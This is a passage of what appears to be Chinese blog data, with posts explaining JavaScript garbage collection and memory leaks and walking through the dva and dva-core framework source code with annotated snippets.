然而它的属性 a 的对象还在被 oa 引用，所以还不能回收 oa = null; // a 属性的那个对象现在也是零引用了，它可以被垃圾回收了 这种算法的局限性体现在循环引用： 12345678function f() &#123; var o1 = &#123;&#125;; var o2 = &#123;&#125;; o1.p = o2; // o1 references o2 o2.p = o1; // o2 references o1. This creates a cycle.&#125;f(); 这样垃圾收集器会认为对象至少会被引用一次，而不会回收这块内存。导致内存泄露。 2、标记-清除算法： 这个算法是现在浏览器基本都有的，其核心思想就是不能被引用的对象可被回收。 原理大致是: 1）有一个 GC root 列表，保存了引用的全局变量，比如 window 2）root 被认为是活动的，不被回收，然后递归检查其子节点，可以被访问的都标记为活动的 3）所有的不被标记的，都是可回收的 这样的话，上面的循环引用，在函数结束后，o1,o2 不再被全局变量所能访问的对象引用，就会被认为是垃圾。 十、内存泄露 首先 GC 是无法预测的，其实回收更多的是取决于我们自己怎么去写程序。或多或少年少的我们写的代码都导致了一些内存无法被释放，造成了内存的泄露。 常见的内存泄露有以下许多（都是 copy 的经典例子）： 1、全局变量： 根据上边的标记-清除算法，root 列表中的全局变量是不会被释放的。所以我们的代码中显式的全局或者隐式的全局变量是不会被垃圾收集器回收的。隐式的全局变量有(还有很多): 1）忘记写声明了： 12345function foo()&#123; boss = 'jack ma'&#125;foo();window.boss; // \"jack ma\" 引擎对 boss 进行 LHS 查询，在当前作用域没有找到声明，就去外层也就是全局之中找，也没找到，这个时候它就会发善心，给你创建一个声明，所以输出 window.boss 是上面的结果。 避免这种情况的办法就是 use strict。 2）this 的默认绑定规则： 12345function foo()&#123; this.boss = 'jack ma'&#125;foo();window.boss; // \"jack ma\" 独立的函数声明采用的是默认绑定规则，也就说 this 是绑定到全局的。 采用 use strict 可以是默认绑定到 undefined。 2、被遗忘的时光 | 回忆： 定时器我们常常使用: 1234567var serverData = loadData();setInterval(function() &#123; var renderer = document.getElementById('renderer'); if(renderer) &#123; renderer.innerHTML = JSON.stringify(serverData); &#125;&#125;, 5000); IE6 时代，假如 serverData 有大量的数据，它是没办法被收集的。但是现代浏览器在这个问题已经做了优化，无需担心。 3、闭包： 123456789101112131415var theThing = null;var replaceThing = function () &#123; var originalThing = theThing; var unused = function () &#123; if (originalThing) // a reference to 'originalThing' console.log(\"hi\"); &#125;; theThing = &#123; longStr: new Array(1000000).join('*'), someMethod: function () &#123; console.log(\"message\"); &#125; &#125;;&#125;;setInterval(replaceThing, 1000); 一旦具有相同父作用域的多个闭包的作用域被创建，则这个作用域就可以被共享。也就是说为 someMethod 创建的作用域是被 unused 共享的。theThing 作为 root 持有对 someMethod 的引用，unused 引用的 originalThing，也迫使其不会被回收。这个问题是 Meteor 小组发现的，有兴趣可以百度。 4、脱离 DOM 的引用： 1234567891011var elements = &#123; button: document.getElementById('button'), image: document.getElementById('image')&#125;;function doStuff() &#123; elements.image.src = 'http://example.com/image_name.png';&#125;function removeImage() &#123; // 删除了 DOM 树中对 image 的引用，但是 GC 并不会回收，因为 elements 还引用了呀！ document.body.removeChild(document.getElementById('image'));&#125; 十一、chrome 工具进行内存分析 利用浏览器进行内存分析，具体步骤请看下面参考的最后两个。 我们以上边的闭包为例： 还有各种 size 之类的就不说了。反正 chrome 很强大！ 参考： MDN How JavaScript works: memory management + how to handle 4 common memory leaks Tracing garbage collection ruanyf blog chrome工具进行内存分析 标注： 参考资料1：https://github.com/cbbfcd/all-of-javascript/blob/master/深入理解JavaScript系列/memory.md","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"Dva官网之06-dva 源码解析","slug":"Dva-gw-06","date":"2019-01-08T01:51:15.000Z","updated":"2019-01-22T10:18:00.294Z","comments":true,"path":"2019/01/08/Dva-gw-06/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/08/Dva-gw-06/","excerpt":"","text":"一、项目 &gt; package.json dva 项目只要敲入 npm start 就可以运行启动，在敲下这行命令的时候发生了什么？答案要去 package.json 里去寻找（看源码之前，先去看 package.json，看看项目的入口文件，用了哪些依赖，对项目便有了大致的概念）。 package.json 里写： 123\"scripts\": &#123; \"start\": \"roadhog server\"&#125;, 翻翻依赖: 1\"roadhog\": \"^0.5.2\"。 既然能在 devDependencies 找到，那么肯定也能在 npm 上找到，原来是个和 webpack 相似的库，而且作者看着有点眼熟。如果说 dva 是亲女儿，那 roadhog 就是亲哥哥，起的是 webpack 自动打包和热更替的作用。在 roadhog 的默认配置里有这么一条信息： 123&#123; \"entry\": \"src/index.js\",&#125; 转了一圈，启动的入口回到了 src/index.js。 二、项目 &gt; src/index.js 在 src/index.js 里，dva 一共做了这么几件事： 1234567891011import dva from 'dva'; // 从 dva 依赖中引入 dvaconst app = dva(); // 通过函数生成一个 app 对象app.use(&#123;&#125;); // 加载插件app.model(require('./models/example')); // 注入 modelapp.router(require('./routes/indexAnother')); // 添加路由app.start('#root'); // 启动 在这 6 步当中，dva 完成了使用 React 解决 view 层、redux 管理 model、saga 解决异步的主要功能。事实上目前前端框架之所以被称为框架也就是解决了这些事情。前端工程师至今所做的事情都是在分离动态的 data 和静态的 view，只不过侧重点和实现方式也不同。 至今为止出了这么多框架，但是前端 MVX 的思想一直都没有改变。 三、dva &gt; package.json 剧透：dva 是个函数，返回一了个 app 的对象。目前 dva 的源码核心部分包含两部分，dva 和 dva-core。前者用高阶组件 React-redux 实现了 view 层，后者是用 redux-saga 解决了 model 层。 接下来我们寻找一下 dva 的 源码。老规矩，还是先翻 package.json。引用依赖很好的说明了 dva 的功能：统一 view 层。 12345678910111213// dva 使用的依赖如下：\"babel-runtime\": \"^6.26.0\", // 一个编译后文件引用的公共库，可以有效减少编译后的文件体积\"dva-core\": \"^1.1.0\", // dva 另一个核心，用于处理数据层\"global\": \"^4.3.2\", // 用于提供全局函数的引用\"history\": \"^4.6.3\", // browserHistory 或者 hashHistory\"invariant\": \"^2.2.2\", // 一个有趣的断言库\"isomorphic-fetch\": \"^2.2.1\", // 方便请求异步的函数，dva 中的 fetch 来源\"react-async-component\": \"^1.0.0-beta.3\", // 组件懒加载\"react-redux\": \"^5.0.5\", // 提供了一个高阶组件，方便在各处调用 store\"react-router-dom\": \"^4.1.2\", // router4，终于可以像写组件一样写 router 了\"react-router-redux\": \"5.0.0-alpha.6\", // redux 的中间件，在 provider 里可以嵌套 router\"redux\": \"^3.7.2\" // 提供了 store、dispatch、reducer 不过 script 没有给太多有用的信息，因为 ruban build 中的 ruban 显然是个私人库(虽然在 tnpm 上可以查到但也是私人库)。根据惯例，应该是 dva 包下的 index.js 文件提供了对外调用： 123456Object.defineProperty(exports, \"__esModule\", &#123; value: true&#125;);exports.default = require('./lib');exports.connect = require('react-redux').connect; 显然这个 exports.default 就是我们要找的 dva，但是源码中没有 ./lib 文件夹。当然直接看也应该看不懂，因为一般都是使用 babel 的命令 babel src -d libs 进行编译后生成的，所以直接去看 src/index.js 文件。 四、dva &gt; src/index.js 在 src/index.js 中，dva 做了三件比较重要的事情： 1）使用 call 给 dva-core 实例化的 app(这个时候还只有数据层) 的 start 方法增加了一些新功能（或者说，通过代理模式给 model 层增加了 view 层）。 2）使用 react-redux 完成了 react 到 redux 的连接。 3）添加了 redux 的中间件 react-redux-router，强化了 history 对象的功能。 使用 call 方法实现代理模式： dva 中实现代理模式的方式如下： a. 新建 function，函数内实例化一个 app 对象。 b. 新建变量指向该对象希望代理的方法， oldStart = app.start。 c. 新建同名方法 start，在其中使用 call，指定 oldStart 的调用者为 app。 d. 令 app.start = start，完成对 app 对象的 start 方法的代理。 上代码: 1234567891011121314151617181920212223242526272829303132333435363738394041export default function(opts = &#123;&#125;) &#123; // ...初始化 route ，和添加 route 中间件的方法。 /** * 1. 新建 function ，函数内实例化一个 app 对象。 */ const app = core.create(opts, createOpts); /** * 2. 新建变量指向该对象希望代理的方法 */ const oldAppStart = app.start; app.router = router; /** * 4. 令 app.start = start，完成对 app 对象的 start 方法的代理。 * @type &#123;[type]&#125; */ app.start = start; return app; // router 赋值 /** * 3.1 新建同名方法 start， */ function start(container) &#123; // 合法性检测代码 /** * 3.2 在其中使用 call，指定 oldStart 的调用者为 app。 */ oldAppStart.call(app); // 因为有 3.2 的执行才有现在的 store const store = app._store; // 使用高阶组件创建视图 &#125;&#125; 问题一：为什么不直接在 start 方式中 oldAppStart？因为 dva-core 的 start 方法里有用到 this，不用 call 指定调用者为 app 的话，oldAppStart() 会找错对象。 问题二：实现代理模式一定要用到 call 吗？不一定，看有没有 使用 this 或者代理的函数是不是箭头函数。从另一个角度来说，如果使用了 function 关键字又在内部使用了 this，那么一定要用 call/apply/bind 指定 this。 问题三：前端还有那里会用到 call？就实际开发来讲，因为已经使用了 es6 标准，基本和 this 没什么打交道的机会。使用 class 类型的组件中偶尔还会用到 this.xxx.bind(this)，stateless 组件就洗洗睡吧(因为压根没有 this)。如果实现代理，可以使用继承/反向继承的方法 —— 比如高阶组件。 使用 react-redux 的高阶组件传递 store： 经过 call 代理后的 start 方法的主要作用，便是使用 react-redux 的 provider 组件将数据与视图联系了起来，生成 React 元素呈现给使用者。 上代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 使用 querySelector 获得 domif (isString(container)) &#123; container = document.querySelector(container); invariant( container, `[app.start] container $&#123;container&#125; not found`, );&#125;// 其他代码// 实例化 storeoldAppStart.call(app); const store = app._store;// export _getProvider for HMR// ref: https://github.com/dvajs/dva/issues/469app._getProvider = getProvider.bind(null, store, app);// If has container, render; else, return react component// 如果有真实的 dom 对象就把 react 拍进去if (container) &#123; render(container, store, app, app._router); // 热加载在这里 app._plugin.apply('onHmr')(render.bind(null, container, store, app));&#125; else &#123; // 否则就生成一个 react ，供外界调用 return getProvider(store, this, this._router);&#125;// 使用高阶组件包裹组件function getProvider(store, app, router) &#123; return extraProps =&gt; ( &lt;Provider store=&#123;store&#125;&gt; &#123; router(&#123; app, history: app._history, ...extraProps &#125;) &#125; &lt;/Provider&gt; );&#125;// 真正的 react 在这里function render(container, store, app, router) &#123; const ReactDOM = require('react-dom'); // eslint-disable-line ReactDOM.render(React.createElement(getProvider(store, app, router)), container);&#125; 问题一：React.createElement(getProvider(store, app, router)) 怎么理解？getProvider 实际上返回的不单纯是函数，而是一个无状态的 React 组件。从这个角度理解的话，ReactElement.createElement(string/ReactClass type,[object props],[children …]) 是可以这么写的。 问题二：怎么理解 React 的 stateless 组件和 class 组件？JavaScript 并不存在 class 这个东西，即便是 es6 引入了以后经过 babel 编译也会转换成函数。因此直接使用无状态组件，省去了将 class 实例化再调用 render 函数的过程，有效的加快了渲染速度。即便是 class 组件，React.createElement 最终调用的也是 render 函数。不过这个目前只是推论，没有代码证据的证明。 问题三：provider 是个什么东西？本质上是个高阶组件，也是代理模式的一种实践方式。接收 redux 生成的 store 做参数后，通过上下文 context 将 store 传递进被代理组件。在保留原组件的功能不变的同时，增加了 store 的 dispatch 等方法。 问题四：connect 是个什么东西？connect 也是一个代理模式实现的高阶组件，为被代理的组件实现了从 context 中获得 store 的方法。 问题五：connect()(MyComponent) 时发生了什么？先看结论，对于 connect()(MyComponent)，a、connect 调用时生成 0 号 connect；b、connect() 0 号 connect 调用，返回 1 号 connect 的调用 connectHOC() ，生成 2 号 connect(也是个函数) ；c、connect()(MyComponent) 等价于 connect2(MyComponent)，返回值是一个新的组件。再放关键部分代码: 123456789101112131415161718192021import connectAdvanced from '../components/connectAdvanced' export function createConnect(&#123; connectHOC = connectAdvanced, .... 其他初始值&#125; = &#123;&#125;) &#123; return function connect( &#123; // 0 号 connnect mapStateToProps, mapDispatchToProps, ... 其他初始值 &#125; = &#123;&#125; ) &#123; ....其他逻辑 return connectHOC(selectorFactory, &#123;// 1号 connect .... 默认参数 selectorFactory 也是个默认参数 &#125;) &#125;&#125;export default createConnect() // 这是 connect 的本体，导出时即生成 connect 0 12345678910111213141516171819202122232425262728293031323334// hoist-non-react-statics，会自动把所有绑定在对象上的非React方法都绑定到新的对象上import hoistStatics from 'hoist-non-react-statics'// 1号 connect 的本体export default function connectAdvanced() &#123; // 逻辑处理 // 1 号 connect 调用时生成 2 号 connect return function wrapWithConnect(WrappedComponent) &#123; // ... 逻辑处理 // 在函数内定义了一个可以拿到上下文对象中 store 的组件 class Connect extends Component &#123; getChildContext() &#123; // 上下文对象中获得 store const subscription = this.propsMode ? null : this.subscription return &#123; [subscriptionKey]: subscription || this.context[subscriptionKey] &#125; &#125; // 逻辑处理 render() &#123; // 最终生成了新的 react 元素，并添加了新属性 return createElement(WrappedComponent, this.addExtraProps(selector.props)) &#125; &#125; // 逻辑处理 // 最后用定义的 class 和 被代理的组件生成新的 react 组件 return hoistStatics(Connect, WrappedComponent) // 2 号函数调用后生成的对象是组件 &#125;&#125; redux 与 router： redux 是状态管理的库，router 是唯一控制页面跳转的库。两者都很美好，但是不美好的是两者无法协同工作。换句话说，当路由变化以后，store 无法感知到。 于是便有了 react-router-redux。react-router-redux 是 redux 的一个中间件(中间件：JavaScript 代理模式的另一种实践 针对 dispatch 实现了方法的代理，在 dispatch action 的时候增加或者修改) ，主要作用是加强了 React Router 库中 history 这个实例，以允许将 history 中接受到的变化反应到 state 中去。 从代码上讲，主要是监听了 history 的变化： 1history.listen(location =&gt; analyticsService.track(location.pathname)) dva 在此基础上又进行了一层代理，把代理后的对象当作初始值传递给了 dva-core，方便其在 model 的 subscriptions 中监听 router 变化。 看看 index.js 里 router 的实现： a、在 createOpts 中初始化了添加 react-router-redux 中间件的方法和其 reducer ，方便 dva-core 在创建 store 的时候直接调用。 b、使用 patchHistory 函数代理 history.linsten，增加了一个回调函数的做参数(也就是订阅)。 问题一：subscriptions 的东西可以放在 dva-core 里再说： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import createHashHistory from 'history/createHashHistory';import &#123; routerMiddleware, routerReducer as routing,&#125; from 'react-router-redux';import * as core from 'dva-core';export default function (opts = &#123;&#125;) &#123; const history = opts.history || createHashHistory(); const createOpts = &#123; // 初始化 react-router-redux 的 router initialReducer: &#123; routing, &#125;, // 初始化 react-router-redux 添加中间件的方法，放在所有中间件最前面 setupMiddlewares(middlewares) &#123; return [ routerMiddleware(history), ...middlewares, ]; &#125;, // 使用代理模式为 history 对象增加新功能，并赋给 app setupApp(app) &#123; app._history = patchHistory(history); &#125;, &#125;; const app = core.create(opts, createOpts); const oldAppStart = app.start; app.router = router; app.start = start; return app; function router(router) &#123; invariant( isFunction(router), `[app.router] router should be function, but got $&#123;typeof router&#125;`, ); app._router = router; &#125;&#125;// 使用代理模式扩展 history 对象的 listen 方法，添加了一个回调函数做参数并在路由变化是主动调用function patchHistory(history) &#123; const oldListen = history.listen; history.listen = (callback) =&gt; &#123; callback(history.location); return oldListen.call(history, callback); &#125;; return history;&#125; 问题二：redux 中创建 store 的方法为： 12345678910111213// combineReducers 接收的参数是对象// 所以 initialReducer 的类型是对象// 作用：将对象中所有的 reducer 组合成一个大的 reducerconst reducers = &#123;&#125;; // applyMiddleware 接收的参数是可变参数// 所以 middleware 是数组// 作用：将所有中间件组成一个数组，依次执行const middleware = []; const store = createStore( combineReducers(reducers), initial_state, // 设置 state 的初始值 applyMiddleware(...middleware)); 五、视图与数据 src/index.js 主要实现了 dva 的 view 层，同时传递了一些初始化数据到 dva-core 所实现的 model 层。当然还提供了如下一些 dva 中常用的方法函数，这么看 dva 真的是很薄的一层封装。 1）dynamic 动态加载(2.0 以后官方提供 1.x 自己手动实现吧) 2）fetch 请求方法(其实 dva 只是做了一把搬运工) 3）saga(数据层处理异步的方法)。 而 dva-core 主要解决了 model 的问题，包括 state 管理、数据的异步加载、订阅-发布模式的实现，可以作为数据层在别处使用(看 2.0 更新也确实是作者的意图)。使用的状体啊管理库还是 redux，异步加载的解决方案是 saga。当然，一切也都写在 index.js 和 package.json 里。 处理 React 的 model 层问题有很多种办法，比如状态管理就不一定要用 Redux，也可以使用 Mobx(写法会更有 MVX 框架的感觉)；异步数据流也未必使用 redux-saga，redux-thunk 或者 redux-promise 的解决方式也可以(不过目前看来 saga 是相对更优雅的)。 放两篇个人感觉比较全面的技术文档： 阮一峰前辈的 redux 三部曲。 redux-saga 的 中文文档。 以及两者的 github： redux redux-saga 接下来继续深扒 dva-core，还是先从 package.json 扒起。 六、dva-core &gt; package.json dva-core 的 package.json 中依赖包如下： 12345678\"babel-runtime\": \"^6.26.0\", // 一个编译后文件引用的公共库，可以有效减少编译后的文件体积\"flatten\": \"^1.0.2\", // 一个将多个数组值合并成一个数组的库\"global\": \"^4.3.2\", // 用于提供全局函数比如 document 的引用\"invariant\": \"^2.2.1\", // 一个有趣的断言库\"is-plain-object\": \"^2.0.3\", // 判断是否是一个对象\"redux\": \"^3.7.1\", // redux ，管理 react 状态的库\"redux-saga\": \"^0.15.4\", // 处理异步数据流\"warning\": \"^3.0.0\" // 同样是个断言库，不过输出的是警告 当然因为打包还是用的 ruban，script 里没有什么太多有用的东西。继续依循惯例，去翻 src/index.js。 七、dva-core &gt; src/index.js dva 的 src/index.js 里，通过传递 2 个变量 opts 和 createOpts 并调用 core.create，dva 创建了一个 app 对象。其中 opts 是使用者添加的控制选项，createOpts 则是初始化了 reducer 与 redux 的中间件。 dva-core 的 src/index.js 里便是这个 app 对象的具体创建过程以及包含的方法： 1234567891011121314151617181920212223242526272829export function create(hooksAndOpts = &#123;&#125;, createOpts = &#123;&#125;) &#123; const &#123; initialReducer, setupApp = noop, &#125; = createOpts; const plugin = new Plugin(); plugin.use(filterHooks(hooksAndOpts)); const app = &#123; _models: [ prefixNamespace(&#123; ...dvaModel &#125;), ], _store: null, _plugin: plugin, use: plugin.use.bind(plugin), model, start, &#125;; return app; // .... 方法的实现 function model()&#123; // model 方法 &#125; functoin start()&#123; // Start 方法 &#125;&#125; JavaScript 是一个函数向的编程语言，也就是函数里可以定义函数，返回值也可以是函数，class 最后也是被解释成函数。在 dva-core 里创建了 app 对象，但是把 model 和 start 的定义放在了后面。一开始对这种简写没看懂，后来熟悉了以后发现确实好理解，一眼就可以看到 app 所包含的方法，如果需要研究具体方法的话才需要向后看。 Plugin 与 plugin.use： Plugin 是作者设置的一堆钩子性监听函数，即在符合某些条件的情况下(dva 作者)进行手动调用。这样使用者只要按照作者设定过的关键词传递回调函数，在这些条件下便会自动触发。 最初理解钩子的概念是在 Angular 里，为了能像 React 一样优雅的控制组件的生命周期，Angular 设置了一堆接口(因为使用的是 ts，所以 Angular 里有类和接口的区分)。只要组件实现(implements)对应的接口，或者称生命周期钩子，在对应的条件下就会运行接口的方法。 Plugin 与 plugin.use 都有使用数组的 reduce 方法的行为： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const hooks = [ 'onError', 'onStateChange', 'onAction', 'onHmr', 'onReducer', 'onEffect', 'extraReducers', 'extraEnhancers',];export function filterHooks(obj) &#123; return Object.keys(obj).reduce((memo, key) =&gt; &#123; // 如果对象的 key 在 hooks 数组中 // 为 memo 对象添加新的 key，值为 obj 对应 key 的值 if (hooks.indexOf(key) &gt; -1) &#123; memo[key] = obj[key]; &#125; return memo; &#125;, &#123;&#125;);&#125;export default class Plugin &#123; constructor() &#123; this.hooks = hooks.reduce((memo, key) =&gt; &#123; memo[key] = []; return memo; &#125;, &#123;&#125;); /* // 等同于 this.hooks = &#123; onError: [], onStateChange:[], .... extraEnhancers: [] &#125; */ &#125; use(plugin) &#123; invariant(isPlainObject(plugin), 'plugin.use: plugin should be plain object'); const hooks = this.hooks; for (const key in plugin) &#123; if (Object.prototype.hasOwnProperty.call(plugin, key)) &#123; invariant(hooks[key], `plugin.use: unknown plugin property: $&#123;key&#125;`); if (key === 'extraEnhancers') &#123; hooks[key] = plugin[key]; &#125; else &#123; hooks[key].push(plugin[key]); &#125; &#125; &#125; &#125; // 其他方法&#125; 代码解释： 1）构造器中的 reduce 初始化了一个以 hooks 数组所有元素为 key，值为空数组的对象，并赋给了 class 的私有变量 this.hooks。 2）filterHooks 通过 reduce 过滤了 hooks 数组以外的钩子。 3）use 中使用 hasOwnProperty 判断 key 是 plugin 的自身属性还是继承属性，使用原型链调用而不是 plugin.hasOwnProperty() 是防止使用者故意捣乱在 plugin 自己写一个 hasOwnProperty = () =&gt; false，这样无论如何调用 plugin.hasOwnProperty() 返回值都是 false。 4）use 中使用 reduce 为 this.hooks 添加了 plugin[key] 。 八、model 方法 model 是 app 添加 model 的方法，在dva 项目的 index.js 是这么用的： 1app.model(require('./models/example')); 在 dva 中没对 model 做任何处理，所以 dva-core 中的 model 就是 dva 项目里调用的 model: 123456function model(m) &#123; if (process.env.NODE_ENV !== 'production') &#123; checkModel(m, app._models); &#125; app._models.push(prefixNamespace(m));&#125; 代码解释： 1）checkModel 主要是用 invariant 对传入的 model 进行了合法性检查。 2）prefixNamespace 又使用 reduce 对每一个 model 做处理，为 model 的 reducers 和 effects 中的方法添加了 ${namespace}/ 的前缀。 3）Ever wonder why we dispatch the action like this in dva ? dispatch({type: ‘example/loadDashboard’ 九、start 方法 start 方法是 dva-core 的核心，在 start 方法里，dva 完成了 store 初始化以及 redux-saga 的调用。比起 dva 的 start，它引入了更多的调用方式。下面一步一步分析： 1、onError： 这是一个全局错误处理，返回了一个接收错误并处理的函数，并以 err 和 app._store.dispatch 为参数执行调用: 1234567891011const onError = (err) =&gt; &#123; if (err) &#123; if (typeof err === 'string') err = new Error(err); err.preventDefault = () =&gt; &#123; err._dontReject = true; &#125;; plugin.apply('onError', (err) =&gt; &#123; throw new Error(err.stack || err); &#125;)(err, app._store.dispatch); &#125;&#125;; 上面代码中，plugin.apply 的实现： 12345678910111213141516171819202122232425262728apply(key, defaultHandler) &#123; const hooks = this.hooks; /* 通过 validApplyHooks 进行过滤， apply 方法只能应用在全局报错或者热更替上 */ const validApplyHooks = ['onError', 'onHmr']; invariant(validApplyHooks.indexOf(key) &gt; -1, `plugin.apply: hook $&#123;key&#125; cannot be applied`); /* 从钩子中拿出挂载的回调函数 ，挂载动作见 use 部分*/ const fns = hooks[key]; return (...args) =&gt; &#123; // 如果有回调执行回调 if (fns.length) &#123; for (const fn of fns) &#123; fn(...args); &#125; // 没有回调直接抛出错误 &#125; else if (defaultHandler) &#123; defaultHandler(...args); /* 这里 defaultHandler 为 (err) =&gt; &#123; throw new Error(err.stack || err); &#125; */ &#125; &#125;;&#125; 2、sagaMiddleware： 下一行代码是 const sagaMiddleware = createSagaMiddleware() 。和 redux-sagas 的入门教程有点差异，因为正统的教程上添加 sagas 中间件的方法是 createSagaMiddleware(…sagas)，sagas 为含有 saga 方法的 generator 函数数组。但是 api 里确实还提到，还有一种动态调用的方式 const task = sagaMiddleware.run(dynamicSaga)。于是： 12345678910111213const sagaMiddleware = createSagaMiddleware();// ...const sagas = [];const reducers = &#123;...initialReducer&#125;;for (const m of app._models) &#123; reducers[m.namespace] = getReducer(m.reducers, m.state); if (m.effects) sagas.push(app._getSaga(m.effects, m, onError, plugin.get('onEffect')));&#125;// ....store.runSaga = sagaMiddleware.run;// Run sagassagas.forEach(sagaMiddleware.run); 3、sagas： 那么 sagas 是什么呢？ 123456789101112const &#123; middleware: promiseMiddleware, resolve, reject,&#125; = createPromiseMiddleware(app);app._getSaga = getSaga.bind(null, resolve, reject);const sagas = [];for (const m of app._models) &#123; if (m.effects) sagas.push(app._getSaga(m.effects, m, onError, plugin.get('onEffect')));&#125; 显然，sagas 是一个数组，里面的元素是用 app._getSaga 处理后的返回结果，而 app._getSaga 又和上面 createPromiseMiddleware 代理 app 后返回的对象有很大关系。 createPromiseMiddleware： createPromiseMiddleware 的代码在此，如果看着觉得眼熟，那肯定不是因为看过 redux-promise 源码的缘故: 123456789101112131415161718192021222324252627282930import &#123; NAMESPACE_SEP &#125; from './constants';export default function createPromiseMiddleware(app) &#123; return () =&gt; next =&gt; action =&gt; &#123; const &#123; type &#125; = action; if (isEffect(type)) &#123; return new Promise((resolve, reject) =&gt; &#123; next(&#123; __dva_resolve: resolve, __dva_reject: reject, ...action, &#125;); &#125;); &#125; else &#123; return next(action); &#125; &#125;; function isEffect(type) &#123; if (!type || typeof type !== 'string') return false; const [namespace] = type.split(NAMESPACE_SEP); const model = app._models.filter(m =&gt; m.namespace === namespace)[0]; if (model) &#123; if (model.effects &amp;&amp; model.effects[type]) &#123; return true; &#125; &#125; return false; &#125;&#125; middleware： middleware 是一个 redux 的中间件，即在不影响 redux 本身功能的情况下为其添加了新特性的代码。redux 的中间件通过拦截 action 来实现其作用的： 123456789101112131415161718192021222324252627const middleware = () =&gt; next =&gt; (action) =&gt; &#123; const &#123; type &#125; = action; if (isEffect(type)) &#123; return new Promise((resolve, reject) =&gt; &#123; // .... resolve ,reject &#125;); &#125; else &#123; return next(action); &#125;&#125;;function isEffect(type) &#123; // dva 里 action 的 type 有固定格式： model.namespace/model.effects // const [namespace] = type.split(NAMESPACE_SEP); 是 es6 解构的写法 // 等同于 const namespace = type.split(NAMESPACE_SEP)[0]; // NAMESPACE_SEP 的值是 `/` const [namespace] = type.split(NAMESPACE_SEP); // 根据 namespace 过滤出对应的 model const model = app._models.filter(m =&gt; m.namespace === namespace)[0]; // 如果 model 存在并且 model.effects[type] 也存在，那必然是 effects if (model) &#123; if (model.effects &amp;&amp; model.effects[type]) &#123; return true; &#125; &#125; return false;&#125; const middleware = ({dispatch}) =&gt; next =&gt; (action) =&gt; {… return next(action)} 基本上是一个标准的中间件写法。在 return next(action) 之前可以对 action 做各种各样的操作。因为此中间件没用到 dispatch 方法，所以省略了。 本段代码的意思是，如果 dispatch 的 action 指向的是 model 里的 effects，那么返回一个 Promise 对象。此 Promise 的对象的解决(resolve) 或者驳回方法 (reject) 放在 map 对象中。如果是非 effects (那就是 action 了)，放行。 换句话说，middleware 拦截了指向 effects 的 action。 神奇的 bind： bind 的作用是绑定新的对象，生成新函数。bind 也可以提前设定好函数的某些参数生成新函数，等到最后一个参数确定时直接调用。(JavaScript 的参数是怎么被调用的？ JavaScript 专题之函数柯里化 ) 这段代码恰好就是 bind 的一种实践方式: 123456789101112131415161718192021222324252627282930313233343536const map = &#123;&#125;;const middleware = () =&gt; next =&gt; (action) =&gt; &#123; const &#123; type &#125; = action; // ... return new Promise((resolve, reject) =&gt; &#123; map[type] = &#123; resolve: wrapped.bind(null, type, resolve), reject: wrapped.bind(null, type, reject), &#125;; &#125;); // ....&#125;;function wrapped(type, fn, args) &#123; if (map[type]) delete map[type]; fn(args);&#125;function resolve(type, args) &#123; if (map[type]) &#123; map[type].resolve(args); &#125;&#125;function reject(type, args) &#123; if (map[type]) &#123; map[type].reject(args); &#125;&#125;return &#123; middleware, resolve, reject,&#125;; 分析这段代码，dva 是这样做的： 1、通过 wrapped.bind(null, type, resolve) 产生了一个新函数，并且赋值给匿名对象的 resolve 属性(reject 同理)。 wrap 接收三个参数，通过 bind 已经设定好了两个，wrapped.bind(null, type, resolve) 等同于 wrap(type, resolve, xxx)，此处 resolve 是 Promise 对象中的。通过 bind 赋给匿名对象的 resolve 属性后，匿名对象.resolve(xxxx) 等同于 wrap(type, resolve, xxx)，即 reslove(xxx)。 2、使用 type 在 map 对象中保存此匿名对象，而 type 是 action 的 type，即 namespace/effects 的形式，方便之后进行调用。 3、return 出的 resolve 接收 type 和 args 两个参数。type 用来在 map 中寻找 1 里的匿名函数，args 用来像 1.2 里那样执行。这样做的作用是：分离了 promise 与 promise 的执行，在函数的作用域外依然可以访问到函数的内部变量，换言之：闭包。 getSaga： 导出的 resolve 与 reject 方法，通过 bind 先设置进了 getSaga (同时也赋给了 app._getSaga)，sagas 最终也将 getSaga 的返回值放入了数组。getSaga源码: 1234567891011121314151617export default function getSaga(resolve, reject, effects, model, onError, onEffect) &#123; return function *() &#123; for (const key in effects) &#123; if (Object.prototype.hasOwnProperty.call(effects, key)) &#123; const watcher = getWatcher(resolve, reject, key, effects[key], model, onError, onEffect); // 将 watcher 分离到另一个线程去执行 const task = yield sagaEffects.fork(watcher); // 同时 fork 了一个线程，用于在 model 卸载后取消正在进行中的 task // `$&#123;model.namespace&#125;/@@CANCEL_EFFECTS` 的发出动作在 index.js 的 start 方法中，unmodel 方法里。 yield sagaEffects.fork(function *() &#123; yield sagaEffects.take(`$&#123;model.namespace&#125;/@@CANCEL_EFFECTS`); yield sagaEffects.cancel(task); &#125;); &#125; &#125; &#125;;&#125; 可以看到，getSaga 最终返回了一个 generator 函数，在该函数遍历了 model 中 effects 属性的所有方法（注：同样是 generator 函数）。结合 index.js 里的 for (const m of app._models)，该遍历针对所有的 model。 对于每一个 effect，getSaga 生成了一个 watcher ，并使用 saga 函数的 fork 将该函数切分到另一个单独的线程中去（生成了一个 task 对象）。同时为了方便对该线程进行控制，在此 fork 了一个 generator 函数。在该函数中拦截了取消 effect 的 action（事实上，应该是卸载effect 所在 model 的 action），一旦监听到则立刻取消分出去的 task 线程。 getWatcher： 12345678910111213141516171819202122232425262728293031323334353637383940414243function getWatcher(resolve, reject, key, _effect, model, onError, onEffect) &#123; let effect = _effect; let type = 'takeEvery'; let ms; if (Array.isArray(_effect)) &#123; // effect 是数组而不是函数的情况下暂不考虑 &#125; function *sagaWithCatch(...args) &#123; // .... sagaWithCatch 的逻辑 &#125; const sagaWithOnEffect = applyOnEffect(onEffect, sagaWithCatch, model, key); switch (type) &#123; case 'watcher': return sagaWithCatch; case 'takeLatest': return function*() &#123; yield takeLatest(key, sagaWithOnEffect); &#125;; case 'throttle': return function*() &#123; yield throttle(ms, key, sagaWithOnEffect); &#125;; default: return function*() &#123; yield takeEvery(key, sagaWithOnEffect); &#125;; &#125;&#125;function createEffects(model) &#123; // createEffects(model) 的逻辑&#125;function applyOnEffect(fns, effect, model, key) &#123; for (const fn of 